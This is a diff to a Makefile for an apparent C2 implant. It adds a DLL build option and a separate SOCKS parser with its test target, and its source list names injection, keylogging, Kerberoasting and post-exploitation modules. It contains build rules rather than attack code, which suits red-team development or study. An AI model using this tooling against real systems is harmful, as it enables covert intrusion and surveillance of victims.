@@ -7,6 +7,7 @@
 # Advanced: CA_CERT_PEM=<base64 DER> overrides path conversion.
 
 OS           ?= windows
+FORMAT       ?= exe
 BUILD_DIR     = ../build
 
 # Prefer openssl/python over xxd (often missing on minimal hosts).
@@ -76,6 +77,7 @@ SRCS = $(COMMON_SRCS) \
 	src/tasks/process_linux.c \
 	src/tasks/network_linux.c \
 	src/tasks/tasks_linux_stub.c \
+	src/tasks/socks_parse.c \
 	src/tasks/socks_linux.c \
 	src/modules/modules_linux.c \
 	src/modules/linux_postex.c \
@@ -83,9 +85,17 @@ SRCS = $(COMMON_SRCS) \
 	linux/main.c
 else
 CC       = x86_64-w64-mingw32-gcc
-OUT      = $(BUILD_DIR)/implant_c.exe
 CFLAGS   = -Wall -Wextra -O2 -std=c11 -Iinclude -D_WIN32_WINNT=0x0601
 LDFLAGS  = -lwinhttp -lcrypt32 -lbcrypt -lws2_32 -lgdi32 -liphlpapi -lwldap32 -lshell32 -ladvapi32 -lwsmsvc -lmpr -lole32 -loleaut32 -lwbemuuid -luuid -static
+ifeq ($(FORMAT),dll)
+OUT      = $(BUILD_DIR)/implant_c.dll
+CFLAGS  += -DARK_C_DLL
+LDFLAGS  = -shared -lwinhttp -lcrypt32 -lbcrypt -lws2_32 -lgdi32 -liphlpapi -lwldap32 -lshell32 -ladvapi32 -lwsmsvc -lmpr -lole32 -loleaut32 -lwbemuuid -luuid
+WIN_ENTRY = windows/dllmain.c
+else
+OUT      = $(BUILD_DIR)/implant_c.exe
+WIN_ENTRY = windows/main.c
+endif
 SRCS = $(COMMON_SRCS) \
 	src/platform/platform_win.c \
 	src/syscall/indirect.c \
@@ -119,13 +129,13 @@ SRCS = $(COMMON_SRCS) \
 	src/tasks/inject.c \
 	src/tasks/screenshot.c \
 	src/tasks/keylog.c \
-	src/tasks/socks.c \
-	src/tasks/socks_api_stub.c \
+	src/tasks/socks_parse.c \
+	src/tasks/socks_win.c \
 	src/tasks/peload.c \
-	windows/main.c
+	$(WIN_ENTRY)
 endif
 
-.PHONY: all config clean test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-socks-pb test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux test-host linux windows
+.PHONY: all config clean test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-socks-pb test-socks-parse test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux test-host linux windows
 
 all: config $(OUT)
 
@@ -168,6 +178,13 @@ test-socks-pb:
 		tests/socks_pb_host_test.c src/pb/wire.c src/pb/c2.c src/tasks/socks_api_stub.c \
 		-o $(BUILD_DIR)/socks_pb_host_test
 	$(BUILD_DIR)/socks_pb_host_test
+
+test-socks-parse:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude \
+		tests/socks_parse_host_test.c src/tasks/socks_parse.c \
+		-o $(BUILD_DIR)/socks_parse_host_test
+	$(BUILD_DIR)/socks_parse_host_test
 
 test-unique-ms:
 	@mkdir -p $(BUILD_DIR)
@@ -213,7 +230,7 @@ test-task-typed-linux:
 		-o $(BUILD_DIR)/task_typed_linux_host_test -lssl -lcrypto
 	$(BUILD_DIR)/task_typed_linux_host_test
 
-test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-socks-pb test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux
+test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-socks-pb test-socks-parse test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux
 
 config:
 	@chmod +x scripts/gen_config.sh
@@ -234,4 +251,4 @@ $(OUT): config $(SRCS)
 	$(CC) $(CFLAGS) $(SRCS) -o $(OUT) $(LDFLAGS)
 
 clean:
-	rm -f include/ark/config.h $(BUILD_DIR)/implant_c.exe $(BUILD_DIR)/implant_c_linux
+	rm -f include/ark/config.h $(BUILD_DIR)/implant_c.exe $(BUILD_DIR)/implant_c.dll $(BUILD_DIR)/implant_c_linux
